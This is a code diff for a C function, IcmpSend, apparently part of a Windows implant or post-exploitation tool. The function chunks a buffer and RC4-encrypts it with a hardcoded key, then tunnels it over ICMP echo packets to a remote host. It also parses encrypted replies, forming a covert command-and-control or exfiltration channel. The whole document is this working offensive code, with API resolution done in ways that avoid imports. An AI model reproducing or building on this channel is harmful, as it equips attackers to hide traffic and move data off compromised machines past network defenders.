@@ -90,25 +90,26 @@ typedef struct
 !*/
 D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 InLength )
 {
-	API		Api;
-	IN_ADDR		Ip4;
-	RC4_BUF		Key;
-	RC4_BUF		Rc4;
-	HDR_PKT		Hdr;
-	SEQ_PKT		Seq;
-	ANSI_STRING	Ani;
-	UNICODE_STRING	Uni;
+	API			Api;
+	IN_ADDR			Ip4;
+	RC4_BUF			Key;
+	RC4_BUF			Rc4;
+	HDR_PKT			Hdr;
+	SEQ_PKT			Seq;
+	ANSI_STRING		Ani;
+	UNICODE_STRING		Uni;
 
-	BOOL		Ret = FALSE;
-	ULONG		Len = 0;
+	BOOL			Ret = FALSE;
+	ULONG			Len = 0;
 
-	PVOID		Icp = NULL;
-	PVOID		Adv = NULL;
-	HANDLE		Icf = INVALID_HANDLE_VALUE;
-	PBUFFER		Snd = NULL;
-	PBUFFER		Rcv = NULL;
-	PHDR_PKT	Hdp = NULL;
-	PSEQ_PKT	Sqp = NULL;
+	PVOID			Icp = NULL;
+	PVOID			Adv = NULL;
+	HANDLE			Icf = INVALID_HANDLE_VALUE;
+	PBUFFER			Snd = NULL;
+	PBUFFER			Rcv = NULL;
+	PHDR_PKT		Hdp = NULL;
+	PSEQ_PKT		Sqp = NULL;
+	PICMP_ECHO_REPLY	Rep = NULL;
 
 	/* Zero out the stack structure */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
@@ -145,10 +146,9 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_PTR( "SystemFunction032" ) ) );
 		
 			if ( NT_SUCCESS( Api.LdrGetProcedureAddress( Adv, &Ani, 0, &Api.SystemFunction032 ) ) ) {
-
 				/* Initialize header and sequence packet */
 				Hdr.Signature  = 0xFEFE;
-				Seq.Id        = 0x4242;
+				Seq.Id         = 0x4343; // change me to random! 
 				Seq.ChunkTotal = ( ( InLength + ( ICMP_CHUNK_SIZE - 1 ) ) / ICMP_CHUNK_SIZE );
 
 				/* Attempt to send a chunk(s) */
@@ -173,15 +173,15 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 								break;
 							};
 						};
+
 						Hdp = C_PTR( Snd->Buffer );
 						Sqp = C_PTR( Hdp->Buffer );
 						Sqp->ChunkNumber = Idx + 1;
 
 						/* Encrypt the buffer & set the key */
-
 						/* Note: Change from hardcoded! */
-						Key.Length = Key.MaximumLength = 32;
-						Key.Buffer = C_PTR( G_PTR( "N1Ik06XFZtSZj0DguXkwuUIdcs7roZ1S" ) );
+						Key.Length = Key.MaximumLength = 32; // change me to random!
+						Key.Buffer = C_PTR( G_PTR( "N1Ik06XFZtSZj0DguXkwuUIdcs7roZ1S" ) ); // change me to random!
 						Rc4.Length = Rc4.MaximumLength = sizeof( SEQ_PKT ) + InLength;
 						Rc4.Buffer = C_PTR( Sqp );
 
@@ -198,24 +198,49 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 								/* Search up a hostname */
 								if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &( PCHAR ){ ( CHAR ){ 0x0 } }, &Ip4 ) ) ) {
 									if ( ( Rcv = BufferCreate() ) != NULL ) {
-
-										if ( ( Rcv->Buffer = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, ICMP_CHUNK_SIZE + 1024 ) ) ) {
-											Rcv->Length = ICMP_CHUNK_SIZE + 1024;
-
+										/* Extend to the full size of the reply */
+										if ( BufferExtend( Rcv, ICMP_CHUNK_SIZE + 1024 ) ) {
 											if ( Api.IcmpSendEcho( Icf, Ip4.s_addr, Snd->Buffer, Snd->Length, NULL, Rcv->Buffer, Rcv->Length, 5000 ) ) 
 											{
-												/* Create Buffer */
+												Rep = C_PTR( Rcv->Buffer );
+
+												/* Is big enough to hold a packet for chunking?. Abort if not! */
+												if ( Rep->DataSize < ( sizeof( HDR_PKT ) + sizeof( SEQ_PKT ) ) ) {
+													break;
+												};
+
+												Hdp = C_PTR( Rep->Data );
+
+												/* Is a valid response packet? Abort if not! */
+												if ( Hdp->Signature != 0xFFFF ) {
+													break;
+												};
+												
+												/* Set the size of the buffer for ARC4 */
+												Sqp = C_PTR( Hdp->Buffer );
+												Rc4.Length = Rc4.MaximumLength = Rep->DataSize - sizeof( HDR_PKT );
+												Rc4.Buffer = C_PTR( Hdp->Buffer );
+
+												/* Decrypt the packet */
+												if ( NT_SUCCESS( Api.SystemFunction032( &Rc4, &Key ) ) ) 
+												{
+													/* Not a valid ID ! */
+													if ( ( Idx + 1 ) != Seq.ChunkTotal && Seq.Id != Sqp->Id ) {
+														break;
+													};
+													/* Status */
+													Ret = TRUE;
+												} else {
+													break;
+												};
 											} else {
 												break;
 											};
-
-											/* Cleanup allocation */
-											Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
 										} else {
 											break;
 										};
-
 										/* Cleanup allocation */
+										Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv->Buffer );
 										Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Rcv );
 										Rcv = NULL;
 									} else {
@@ -272,4 +297,7 @@ D_SEC( B ) BOOL IcmpSend( _In_ PCHAR HostName, _In_ PVOID InBuffer, _In_ UINT32 
 	RtlSecureZeroMemory( &Seq, sizeof( Seq ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
+
+	/* Did we fail or succeed? */
+	return Ret;
 };
